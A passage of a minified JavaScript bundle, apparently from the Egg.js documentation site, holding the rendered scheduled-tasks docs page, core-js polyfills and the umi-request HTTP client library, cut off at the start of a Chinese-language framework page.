",r.a.createElement(l["Link"],{to:"https://github.com/harrisiirak/cron-parser"},"cron-parser"),"."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: cron-parser supports second (which don't support by linux crontab).")),r.a.createElement(o["a"],{code:"*    *    *    *    *    *\n\u252c    \u252c    \u252c    \u252c    \u252c    \u252c\n\u2502    \u2502    \u2502    \u2502    \u2502    |\n\u2502    \u2502    \u2502    \u2502    \u2502    \u2514 day of week (0 - 7) (0 or 7 is Sun)\n\u2502    \u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500 month (1 - 12)\n\u2502    \u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of month (1 - 31)\n\u2502    \u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 hour (0 - 23)\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 minute (0 - 59)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 second (0 - 59, optional)",lang:"bash"}),r.a.createElement(o["a"],{code:"module.exports = {\n  schedule: {\n    // executed every three hours (zero minutes and zero seconds)\n    cron: '0 0 */3 * * *',\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"type"},r.a.createElement(l["AnchorLink"],{to:"#type","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Type"),r.a.createElement("p",null,"The framework scheduled tasks support two types by default, worker and all. Both worker and all support the above two schedule modes, except when it comes time to execute, the worker who executes the scheduled tasks is different:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"worker")," type: only one worker per machine executes this scheduled task, the worker to execute is random."),r.a.createElement("li",null,r.a.createElement("code",null,"all")," type: each worker on each machine executes this scheduled task.")),r.a.createElement("h3",{id:"other-parameters"},r.a.createElement(l["AnchorLink"],{to:"#other-parameters","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Other Parameters"),r.a.createElement("p",null,"In addition to the parameters just introduced, scheduled task also supports these parameters:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"cronOptions"),": configure cron time zone and so on, reference ",r.a.createElement(l["Link"],{to:"https://github.com/harrisiirak/cron-parser#options"},"cron-parser")),r.a.createElement("li",null,r.a.createElement("code",null,"immediate"),": when this parameter is set to true, this scheduled task will be executed immediately after the application is started and ready."),r.a.createElement("li",null,r.a.createElement("code",null,"disable"),": when this parameter is set to true, this scheduled task will not be executed."),r.a.createElement("li",null,r.a.createElement("code",null,"env"),": env list to decide whether start this task at current env.")),r.a.createElement("h3",{id:"logging"},r.a.createElement(l["AnchorLink"],{to:"#logging","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Logging"),r.a.createElement("p",null,"Schedule log will be written to ",r.a.createElement("code",null,"$","{","appInfo.root","}","/logs/","{","app_name","}","/egg-schedule.log"),", but won't be logged to terminal by default, you could customize via ",r.a.createElement("code",null,"config.customLogger.scheduleLogger"),"."),r.a.createElement(o["a"],{code:"// config/config.default.js\nconfig.customLogger = {\n  scheduleLogger: {\n    // consoleLevel: 'NONE',\n    // file: path.join(appInfo.root, 'logs', appInfo.name, 'egg-schedule.log'),\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"dynamically-configure-scheduled-tasks"},r.a.createElement(l["AnchorLink"],{to:"#dynamically-configure-scheduled-tasks","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Dynamically Configure Scheduled Tasks"),r.a.createElement("p",null,"Sometimes we need to configure the parameters of scheduled tasks. Scheduled tasks support another development style:"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  return {\n    schedule: {\n      interval: app.config.cacheTick,\n      type: 'all',\n    },\n    async task(ctx) {\n      const res = await ctx.curl('http://www.api.com/cache', {\n        contentType: 'json',\n      });\n      ctx.app.cache = res.data;\n    },\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"manually-execute-scheduled-tasks"},r.a.createElement(l["AnchorLink"],{to:"#manually-execute-scheduled-tasks","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Manually Execute Scheduled Tasks"),r.a.createElement("p",null,"We can run a scheduled task via ",r.a.createElement("code",null,"app.runSchedule(schedulePath)"),". ",r.a.createElement("code",null,"app.runSchedule")," reads a scheduled task file path (either a relative path in ",r.a.createElement("code",null,"app/schedule")," or a complete absolute path), executes the corresponding scheduled task, and returns a Promise."),r.a.createElement("p",null,"There are some scenarios we may need to manually execute scheduled tasks, for example"),r.a.createElement("ul",null,r.a.createElement("li",null,"Executing scheduled tasks manually for more elegant unit testing of scheduled tasks.")),r.a.createElement(o["a"],{code:"const mm = require('egg-mock');\nconst assert = require('assert');\n\nit('should schedule work fine', async () => {\n  const app = mm.app();\n  await app.ready();\n  await app.runSchedule('update_cache');\n  assert(app.cache);\n});",lang:"js"}),r.a.createElement("p",null,"When the application starts up, manually perform the scheduled tasks for system initialization, waiting for the initialization finished and then starting the application. See chapter ",r.a.createElement(l["Link"],{to:"./app-start"},"Application Startup Configuration"),", we can implement initialization logic in ",r.a.createElement("code",null,"app.js"),"."),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  app.beforeStart(async () => {\n    // ensure the data is ready before the application starts listening port\n    // follow-up data updates automatically by the scheduled task\n    await app.runSchedule('update_cache');\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"extend-scheduled-task-type"},r.a.createElement(l["AnchorLink"],{to:"#extend-scheduled-task-type","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Scheduled Task Type"),r.a.createElement("p",null,"The framework scheduled tasks only support single worker execution and all worker execution, in some cases, our services are not deployed on a single machine, one of the worker processes in the cluster may execute a scheduled task."),r.a.createElement("p",null,"The framework does not provide this functionality directly, but developers can extend the new type of scheduled tasks themselves in the upper framework."),r.a.createElement("p",null,"Inherit ",r.a.createElement("code",null,"agent.ScheduleStrategy")," in ",r.a.createElement("code",null,"agent.js")," and register it with ",r.a.createElement("code",null,"agent.schedule.use()"),":"),r.a.createElement(o["a"],{code:"module.exports = (agent) => {\n  class ClusterStrategy extends agent.ScheduleStrategy {\n    start() {\n      // subscribe other distributed scheduling service message, after receiving the message, allow a worker process to execute scheduled tasks\n      // the user configures the distributed scheduling scenario in the configuration of the scheduled task\n      agent.mq.subscribe(this.schedule.scene, () => this.sendOne());\n    }\n  }\n  agent.schedule.use('cluster', ClusterStrategy);\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"ScheduleStrategy")," base class provides:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.schedule")," - Properties of schedule tasks, ",r.a.createElement("code",null,"disable")," is supported by default, other configurations can be parsed by developers."),r.a.createElement("li",null,r.a.createElement("code",null,"this.sendOne(...args)")," - Notice worker to execute the task randomly, ",r.a.createElement("code",null,"args")," will pass to ",r.a.createElement("code",null,"subscribe(...args)")," or ",r.a.createElement("code",null,"task(ctx, ...args)"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"this.sendAll(...args)")," - Notice all worker to execute the task."))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},RcAc:function(e,t,n){"use strict";var a=n("dxz4"),r=n("xyr1");e.exports=a("Set",(function(e){return function(){return e(this,arguments.length?arguments[0]:void 0)}}),r)},RdBk:function(e,t){e.exports=Array.isArray||function(e){return"[object Array]"==Object.prototype.toString.call(e)}},RhNf:function(e,t,n){"use strict";var a=n("th5x"),r=n("vhyO"),l=n("PM/J"),o=a("%TypeError%"),i=a("%WeakMap%",!0),c=a("%Map%",!0),s=r("WeakMap.prototype.get",!0),u=r("WeakMap.prototype.set",!0),d=r("WeakMap.prototype.has",!0),m=r("Map.prototype.get",!0),p=r("Map.prototype.set",!0),h=r("Map.prototype.has",!0),g=function(e,t){for(var n,a=e;null!==(n=a.next);a=n)if(n.key===t)return a.next=n.next,n.next=e.next,e.next=n,n},f=function(e,t){var n=g(e,t);return n&&n.value},E=function(e,t,n){var a=g(e,t);a?a.value=n:e.next={key:t,next:e.next,value:n}},b=function(e,t){return!!g(e,t)};e.exports=function(){var e,t,n,a={assert:function(e){if(!a.has(e))throw new o("Side channel does not contain "+l(e))},get:function(a){if(i&&a&&("object"===typeof a||"function"===typeof a)){if(e)return s(e,a)}else if(c){if(t)return m(t,a)}else if(n)return f(n,a)},has:function(a){if(i&&a&&("object"===typeof a||"function"===typeof a)){if(e)return d(e,a)}else if(c){if(t)return h(t,a)}else if(n)return b(n,a);return!1},set:function(a,r){i&&a&&("object"===typeof a||"function"===typeof a)?(e||(e=new i),u(e,a,r)):c?(t||(t=new c),p(t,a,r)):(n||(n={key:{},next:null}),E(n,a,r))}};return a}},Rlpu:function(e,t,n){var a=n("45Gl"),r=n("csaP"),l=n("BHsG"),o=n("NIsy");function i(e){return a(e)||r(e)||l(e)||o()}e.exports=i,e.exports.__esModule=!0,e.exports["default"]=e.exports},Rx0n:function(e,t,n){var a=n("Xdqv");e.exports=!a((function(){return Object.isExtensible(Object.preventExtensions({}))}))},"S/RT":function(e,t,n){"use strict";var a=n("0mt+"),r=n("KeQb");a({target:"RegExp",proto:!0,forced:/./.exec!==r},{exec:r})},SCbZ:function(e,t){var n=Math.ceil,a=Math.floor;e.exports=function(e){return isNaN(e=+e)?0:(e>0?a:n)(e)}},SN3B:function(e,t,n){var a=n("0mt+"),r=n("V2dk");a({target:"Map",stat:!0},{from:r})},SWZC:function(e,t,n){var a=n("WM7W");a("observable")},SX5a:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("o7Ua");a({target:"WeakSet",proto:!0,real:!0,forced:r},{addAll:function(){return l.apply(this,arguments)}})},SgJm:function(e,t){function n(e){return null!=e&&"object"==typeof e}e.exports=n},"St/g":function(e,t,n){var a=n("rdCR"),r=n("AzF/"),l=n("AbF8");a||r(Object.prototype,"toString",l,{unsafe:!0})},Sycc:function(e,t,n){"use strict";(function(e){n.d(t,"a",(function(){return oe}));var a=n("W1of");n("UyPl");function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){u(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e){return o="function"===typeof Symbol&&"symbol"===typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"===typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},o(e)}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}function c(e,t){for(var n=0;n<t.length;n++){var a=t[n];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(e,a.key,a)}}function s(e,t,n){return t&&c(e.prototype,t),n&&c(e,n),e}function u(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function d(e,t){if("function"!==typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&p(e,t)}function m(e){return m=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)},m(e)}function p(e,t){return p=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e},p(e,t)}function h(){if("undefined"===typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"===typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}function g(e,t,n){return g=h()?Reflect.construct:function(e,t,n){var a=[null];a.push.apply(a,t);var r=Function.bind.apply(e,a),l=new r;return n&&p(l,n.prototype),l},g.apply(null,arguments)}function f(e){return-1!==Function.toString.call(e).indexOf("[native code]")}function E(e){var t="function"===typeof Map?new Map:void 0;return E=function(e){if(null===e||!f(e))return e;if("function"!==typeof e)throw new TypeError("Super expression must either be null or a function");if("undefined"!==typeof t){if(t.has(e))return t.get(e);t.set(e,n)}function n(){return g(e,arguments,m(this).constructor)}return n.prototype=Object.create(e.prototype,{constructor:{value:n,enumerable:!1,writable:!0,configurable:!0}}),p(n,e)},E(e)}function b(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function v(e,t){if(t&&("object"===typeof t||"function"===typeof t))return t;if(void 0!==t)throw new TypeError("Derived constructors may only return object or undefined");return b(e)}function y(e){var t=h();return function(){var n,a=m(e);if(t){var r=m(this).constructor;n=Reflect.construct(a,arguments,r)}else n=a.apply(this,arguments);return v(this,n)}}function k(e){return w(e)||x(e)||j(e)||C()}function w(e){if(Array.isArray(e))return S(e)}function x(e){if("undefined"!==typeof Symbol&&null!=e[Symbol.iterator]||null!=e["@@iterator"])return Array.from(e)}function j(e,t){if(e){if("string"===typeof e)return S(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?S(e,t):void 0}}function S(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function C(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function A(e){if(!Array.isArray(e))throw new TypeError("Middlewares must be an array!");for(var t=e.length,n=0;n<t;n++)if("function"!==typeof e[n])throw new TypeError("Middleware must be componsed of function");return function(t,n){var a=-1;function r(l){if(l<=a)return Promise.reject(new Error("next() should not be called multiple times in one middleware!"));a=l;var o=e[l]||n;if(!o)return Promise.resolve();try{return Promise.resolve(o(t,(function(){return r(l+1)})))}catch(i){return Promise.reject(i)}}return r(0)}}var L=function(){function t(e){if(i(this,t),!Array.isArray(e))throw new TypeError("Default middlewares must be an array!");this.defaultMiddlewares=k(e),this.middlewares=[]}return s(t,[{key:"use",value:function(n){var a=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{global:!1,core:!1,defaultInstance:!1},r=!1,l=!1,i=!1;"number"===typeof a?(e&&Object({NODE_ENV:"production"}),r=!0,l=!1):"object"===o(a)&&a&&(l=a.global||!1,r=a.core||!1,i=a.defaultInstance||!1),l?t.globalMiddlewares.splice(t.globalMiddlewares.length-t.defaultGlobalMiddlewaresLength,0,n):r?t.coreMiddlewares.splice(t.coreMiddlewares.length-t.defaultCoreMiddlewaresLength,0,n):i?this.defaultMiddlewares.push(n):this.middlewares.push(n)}},{key:"execute",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:null,n=A([].concat(k(this.middlewares),k(this.defaultMiddlewares),k(t.globalMiddlewares),k(t.coreMiddlewares)));return n(e)}}]),t}();L.globalMiddlewares=[],L.defaultGlobalMiddlewaresLength=0,L.coreMiddlewares=[],L.defaultCoreMiddlewaresLength=0;var T=function(){function e(t){i(this,e),this.cache=new Map,this.timer={},this.extendOptions(t)}return s(e,[{key:"extendOptions",value:function(e){this.maxCache=e.maxCache||0}},{key:"get",value:function(e){return this.cache.get(JSON.stringify(e))}},{key:"set",value:function(e,t){var n=this,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:6e4;if(this.maxCache>0&&this.cache.size>=this.maxCache){var r=k(this.cache.keys())[0];this.cache["delete"](r),this.timer[r]&&clearTimeout(this.timer[r])}var l=JSON.stringify(e);this.cache.set(l,t),a>0&&(this.timer[l]=setTimeout((function(){n.cache["delete"](l),delete n.timer[l]}),a))}},{key:"delete",value:function(e){var t=JSON.stringify(e);return delete this.timer[t],this.cache["delete"](t)}},{key:"clear",value:function(){return this.timer={},this.cache.clear()}}]),e}(),N=function(e){d(n,e);var t=y(n);function n(e,a){var r,l=arguments.length>2&&void 0!==arguments[2]?arguments[2]:"RequestError";return i(this,n),r=t.call(this,e),r.name="RequestError",r.request=a,r.type=l,r}return n}(E(Error)),O=function(e){d(n,e);var t=y(n);function n(e,a,r,l){var o,c=arguments.length>4&&void 0!==arguments[4]?arguments[4]:"ResponseError";return i(this,n),o=t.call(this,a||e.statusText),o.name="ResponseError",o.data=r,o.response=e,o.request=l,o.type=c,o}return n}(E(Error));function I(e){return new Promise((function(t,n){var a=new FileReader;a.onload=function(){t(a.result)},a.onerror=n,a.readAsText(e,"GBK")}))}function P(e){var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1],n=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:null;try{return JSON.parse(e)}catch(r){if(t)throw new O(n,"JSON.parse fail",e,a,"ParseError")}return e}function R(e,t,n){return new Promise((function(a,r){setTimeout((function(){r(new N(t||"timeout of ".concat(e,"ms exceeded"),n,"Timeout"))}),e)}))}function _(e){return new Promise((function(t,n){e.cancelToken&&e.cancelToken.promise.then((function(e){n(e)}))}))}var q=Object.prototype.toString;function M(){var t;return"undefined"!==typeof e&&"[object process]"===q.call(e)&&(t="NODE"),"undefined"!==typeof XMLHttpRequest&&(t="BROWSER"),t}function F(e){return"object"===o(e)&&"[object Array]"===Object.prototype.toString.call(e)}function D(e){return"undefined"!==typeof URLSearchParams&&e instanceof URLSearchParams}function U(e){return"object"===o(e)&&"[object Date]"===Object.prototype.toString.call(e)}function z(e){return null!==e&&"object"===o(e)}function H(e,t){if(e)if("object"!==o(e)&&(e=[e]),F(e))for(var n=0;n<e.length;n++)t.call(null,e[n],n,e);else for(var a in e)Object.prototype.hasOwnProperty.call(e,a)&&t.call(null,e[a],a,e)}function B(e){return D(e)?Object(a["parse"])(e.toString(),{strictNullHandling:!0}):"string"===typeof e?[e]:e}function W(e){return Object(a["stringify"])(e,{arrayFormat:"repeat",strictNullHandling:!0})}function V(e,t){return l(l(l({},e),t),{},{headers:l(l({},e.headers),t.headers),params:l(l({},B(e.params)),B(t.params)),method:(t.method||e.method||"get").toLowerCase()})}var $=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=t.prefix,a=t.suffix;return n&&(e="".concat(n).concat(e)),a&&(e="".concat(e).concat(a)),{url:e,options:t}};function G(e,t){var n=t.method,a=void 0===n?"get":n;return"get"===a.toLowerCase()}function X(t,n){if(!t)return n();var a=t.req;a=void 0===a?{}:a;var r=a.options,l=void 0===r?{}:r,o=a.url,i=void 0===o?"":o,c=t.cache,s=t.responseInterceptors,u=l.timeout,d=void 0===u?0:u,m=l.timeoutMessage,p=l.__umiRequestCoreType__,h=void 0===p?"normal":p,g=l.useCache,f=void 0!==g&&g,E=l.method,b=void 0===E?"get":E,v=l.params,y=l.ttl,k=l.validateCache,w=void 0===k?G:k;if("normal"!==h)return e&&Object({NODE_ENV:"production"}),n();var x=fetch;if(!x)throw new Error("Global fetch not exist!");var j,S="BROWSER"===M(),C=w(i,l)&&f&&S;if(C){var A=c.get({url:i,params:v,method:b});if(A)return A=A.clone(),A.useCache=!0,t.res=A,n()}return j=d>0?Promise.race([_(l),x(i,l),R(d,m,t.req)]):Promise.race([_(l),x(i,l)]),s.forEach((function(e){j=j.then((function(t){var n="function"===typeof t.clone?t.clone():t;return e(n,l)}))})),j.then((function(e){if(C&&200===e.status){var a=e.clone();a.useCache=!0,c.set({url:i,params:v,method:b},a,y)}return t.res=e,n()}))}function Q(e,t){var n;return t().then((function(){if(e){var t=e.res,a=void 0===t?{}:t,r=e.req,l=void 0===r?{}:r,o=l||{},i=o.options;i=void 0===i?{}:i;var c=i.responseType,s=void 0===c?"json":c,u=i.charset,d=void 0===u?"utf8":u,m=(i.getResponse,i.throwErrIfParseFail),p=void 0!==m&&m,h=i.parseResponse,g=void 0===h||h;if(g&&a&&a.clone){if(n="BROWSER"===M()?a.clone():a,n.useCache=a.useCache||!1,"gbk"===d)try{return a.blob().then(I).then((function(e){return P(e,!1,n,l)}))}catch(f){throw new O(n,f.message,null,l,"ParseError")}else if("json"===s)return a.text().then((function(e){return P(e,p,n,l)}));try{return a[s]()}catch(f){throw new O(n,"responseType not support",null,l,"ParseError")}}}})).then((function(t){if(e){e.res;var a=e.req,r=void 0===a?{}:a,l=r||{},o=l.options;o=void 0===o?{}:o;var i=o.getResponse,c=void 0!==i&&i;if(n){if(n.status>=200&&n.status<300)return c?void(e.res={data:t,response:n}):void(e.res=t);throw new O(n,"http error",t,r,"HttpError")}}}))["catch"]((function(t){if(t instanceof N||t instanceof O)throw t;var n=e.req,a=e.res;throw t.request=t.request||n,t.response=t.response||a,t.type=t.type||t.name,t.data=t.data||void 0,t}))}function K(e,t){if(!e)return t();var n=e.req;n=void 0===n?{}:n;var a=n.options,r=void 0===a?{}:a,o=r.method,i=void 0===o?"get":o;if(-1===["post","put","patch","delete"].indexOf(i.toLowerCase()))return t();var c=r.requestType,s=void 0===c?"json":c,u=r.data;if(u){var d=Object.prototype.toString.call(u);"[object Object]"===d||"[object Array]"===d?"json"===s?(r.headers=l({Accept:"application/json","Content-Type":"application/json;charset=UTF-8"},r.headers),r.body=JSON.stringify(u)):"form"===s&&(r.headers=l({Accept:"application/json","Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},r.headers),r.body=W(u)):(r.headers=l({Accept:"application/json"},r.headers),r.body=u)}return e.req.options=r,t()}function J(e,t){var n,a;if(e)if(t)n=t(e);else if(D(e))n=e.toString();else if(F(e))a=[],H(e,(function(e){null===e||"undefined"===typeof e?a.push(e):a.push(z(e)?JSON.stringify(e):e)})),n=W(a);else{a={},H(e,(function(e,t){var n=e;null===e||"undefined"===typeof e?a[t]=e:U(e)?n=e.toISOString():F(e)?n=e:z(e)&&(n=JSON.stringify(e)),a[t]=n}));var r=W(a);n=r}return n}function Y(e,t){if(!e)return t();var n=e.req;n=void 0===n?{}:n;var a=n.options,r=void 0===a?{}:a,l=r.paramsSerializer,o=r.params,i=e.req;i=void 0===i?{}:i;var c=i.url,s=void 0===c?"":c;r.method=r.method?r.method.toUpperCase():"GET",r.credentials=r.credentials||"same-origin";var u=J(o,l);if(e.req.originUrl=s,u){var d=-1!==s.indexOf("?")?"&":"?";e.req.url="".concat(s).concat(d).concat(u)}return e.req.options=r,t()}var Z=[K,Y,Q],ee=[X];L.globalMiddlewares=Z,L.defaultGlobalMiddlewaresLength=Z.length,L.coreMiddlewares=ee,L.defaultCoreMiddlewaresLength=ee.length;var te=function(){function e(t){i(this,e),this.onion=new L([]),this.fetchIndex=0,this.mapCache=new T(t),this.initOptions=t,this.instanceRequestInterceptors=[],this.instanceResponseInterceptors=[]}return s(e,[{key:"use",value:function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{global:!1,core:!1};return this.onion.use(e,t),this}},{key:"extendOptions",value:function(e){this.initOptions=V(this.initOptions,e),this.mapCache.extendOptions(e)}},{key:"dealRequestInterceptors",value:function(t){var n=function(e,n){return e.then((function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return t.req.url=e.url||t.req.url,t.req.options=e.options||t.req.options,n(t.req.url,t.req.options)}))},a=[].concat(k(e.requestInterceptors),k(this.instanceRequestInterceptors));return a.reduce(n,Promise.resolve()).then((function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return t.req.url=e.url||t.req.url,t.req.options=e.options||t.req.options,Promise.resolve()}))}},{key:"request",value:function(t,n){var a=this,r=this.onion,o={req:{url:t,options:l(l({},n),{},{url:t})},res:null,cache:this.mapCache,responseInterceptors:[].concat(k(e.responseInterceptors),k(this.instanceResponseInterceptors))};if("string"!==typeof t)throw new Error("url MUST be a string");return new Promise((function(e,t){a.dealRequestInterceptors(o).then((function(){return r.execute(o)})).then((function(){e(o.res)}))["catch"]((function(n){var a=o.req.options.errorHandler;if(a)try{var r=a(n);e(r)}catch(l){t(l)}else t(n)}))}))}}],[{key:"requestUse",value:function(t){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{global:!0};if("function"!==typeof t)throw new TypeError("Interceptor must be function!");n.global?e.requestInterceptors.push(t):this.instanceRequestInterceptors.push(t)}},{key:"responseUse",value:function(t){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{global:!0};if("function"!==typeof t)throw new TypeError("Interceptor must be function!");n.global?e.responseInterceptors.push(t):this.instanceResponseInterceptors.push(t)}}]),e}();function ne(e){this.message=e}function ae(e){if("function"!==typeof e)throw new TypeError("executor must be a function.");var t;this.promise=new Promise((function(e){t=e}));var n=this;e((function(e){n.reason||(n.reason=new ne(e),t(n.reason))}))}function re(e){return!(!e||!e.__CANCEL__)}te.requestInterceptors=[$],te.responseInterceptors=[],ne.prototype.toString=function(){return this.message?"Cancel: ".concat(this.message):"Cancel"},ne.prototype.__CANCEL__=!0,ae.prototype.throwIfRequested=function(){if(this.reason)throw this.reason},ae.source=function(){var e,t=new ae((function(t){e=t}));return{token:t,cancel:e}};var le=function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},t=new te(e),n=function(e){var n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},a=V(t.initOptions,n);return t.request(e,a)};n.use=t.use.bind(t),n.fetchIndex=t.fetchIndex,n.interceptors={request:{use:te.requestUse.bind(t)},response:{use:te.responseUse.bind(t)}};var a=["get","post","delete","put","patch","head","options","rpc"];return a.forEach((function(e){n[e]=function(t,a){return n(t,l(l({},a),{},{method:e}))}})),n.Cancel=ne,n.CancelToken=ae,n.isCancel=re,n.extendOptions=t.extendOptions.bind(t),n.middlewares={instance:t.onion.middlewares,defaultInstance:t.onion.defaultMiddlewares,global:L.globalMiddlewares,core:L.coreMiddlewares},n},oe=function(e){return le(e)};le({parseResponse:!1}),le({})}).call(this,n("B0ME"))},T68Q:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("3FeB");function r(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,Object(a["a"])(e,t)}},TCvW:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("kqhb"),r=n.n(a);function l(e,t,n,a){var l=r.a.unstable_batchedUpdates?function(e){r.a.unstable_batchedUpdates(n,e)}:n;return null!==e&&void 0!==e&&e.addEventListener&&e.addEventListener(t,l,a),{remove:function(){null!==e&&void 0!==e&&e.removeEventListener&&e.removeEventListener(t,l,a)}}}},TDER:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5982\u679c\u4f60\u7684\u56e2\u961f\u9047\u5230\u8fc7\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7ef4\u62a4\u5f88\u591a\u4e2a\u9879\u76ee\uff0c\u6bcf\u4e2a\u9879\u76ee\u90fd\u9700\u8981\u590d\u5236\u62f7\u8d1d\u8bf8\u5982 ",r.a.createElement("code",null,"gulpfile.js")," / ",r.a.createElement("code",null,"webpack.config.js")," \u4e4b\u7c7b\u7684\u6587\u4ef6\u3002"),r.a.createElement("li",null,"\u6bcf\u4e2a\u9879\u76ee\u90fd\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u76f8\u540c\u7684\u7c7b\u5e93\uff0c\u76f8\u540c\u7684\u914d\u7f6e\u3002"),r.a.createElement("li",null,"\u5728\u65b0\u9879\u76ee\u4e2d\u5bf9\u4e0a\u9762\u7684\u914d\u7f6e\u505a\u4e86\u4e00\u4e2a\u4f18\u5316\u540e\uff0c\u5982\u4f55\u540c\u6b65\u5230\u5176\u4ed6\u9879\u76ee\uff1f")),r.a.createElement("p",null,"\u5982\u679c\u4f60\u7684\u56e2\u961f\u9700\u8981\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u7edf\u4e00\u7684\u6280\u672f\u9009\u578b\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u3001\u6a21\u677f\u3001\u524d\u7aef\u6846\u67b6\u53ca\u5404\u79cd\u4e2d\u95f4\u4ef6\u8bbe\u65bd\u90fd\u9700\u8981\u9009\u578b\uff0c\u800c\u6846\u67b6\u5c01\u88c5\u540e\u4fdd\u8bc1\u5e94\u7528\u4f7f\u7528\u4e00\u5957\u67b6\u6784\u3002"),r.a.createElement("li",null,"\u7edf\u4e00\u7684\u9ed8\u8ba4\u914d\u7f6e\uff0c\u5f00\u6e90\u793e\u533a\u7684\u914d\u7f6e\u53ef\u80fd\u4e0d\u9002\u7528\u4e8e\u516c\u53f8\uff0c\u800c\u53c8\u4e0d\u5e0c\u671b\u5e94\u7528\u53bb\u914d\u7f6e\u3002"),r.a.createElement("li",null,"\u7edf\u4e00\u7684\u90e8\u7f72\u65b9\u6848\uff0c\u901a\u8fc7\u6846\u67b